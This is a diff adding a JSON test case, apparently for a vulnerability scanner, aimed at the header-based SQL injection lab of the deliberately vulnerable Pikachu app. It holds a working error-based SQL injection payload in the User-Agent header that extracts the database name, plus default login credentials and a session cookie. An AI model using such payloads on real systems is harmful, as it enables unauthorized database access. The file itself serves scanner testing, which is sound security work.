@@ -1,0 +1,47 @@
+{
+    "name": "pikachu",
+    "vuln": "http头注入",
+    "version": "",
+    "comment": "仅需要多次发包验证的设置mainRequest字段2,否则都以1为准,多次发包依次延续",
+    "type": "3",
+    "mainRequest": {
+        "1": {
+            "request": {
+                "host": "",
+                "method": "POST",
+                "path": "/vul/sqli/sqli_header/sqli_header_login.php",
+                "cookie": "",
+                "requestheader": {"Content-Type": "application/x-www-form-urlencoded"},
+                "requestbody": "username=admin&password=123456&submit=Login"
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": "朋友，你好，你的信息已经被记录了："
+            }
+        },
+        "2": {
+            "request": {
+                "host": "",
+                "method": "GET",
+                "path": "/vul/sqli/sqli_header/sqli_header.php",
+                "cookie": "",
+                "requestheader": {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "User-Agent": "1' or updatexml(1,concat(0x7e,(select database()),0x7e),1) or '",
+                    "Cookie":"ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=3vi9jg3tgu0bgenjtdij3lhpaq"
+                },
+                "requestbody": ""
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": "XPATH syntax error: '~pikachu~'"
+            }
+        }
+    }
+}
